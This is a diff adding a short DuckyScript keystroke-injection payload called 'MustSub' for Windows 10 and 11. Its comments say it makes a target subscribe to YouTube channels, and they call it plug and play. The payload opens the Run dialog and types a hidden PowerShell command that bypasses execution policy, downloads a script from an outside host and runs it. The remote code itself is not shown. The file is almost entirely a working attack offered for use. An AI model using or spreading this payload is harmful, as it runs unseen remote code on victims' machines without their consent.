@@ -1,0 +1,11 @@
+REM     Title: MustSub
+REM     Author: I am Jakoby
+REM     Description: This payload is used to get your target to subscribe to 15 of my favorite hacker youtube channels
+REM     Target: Windows 10, 11
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/14q | iex
+ENTER
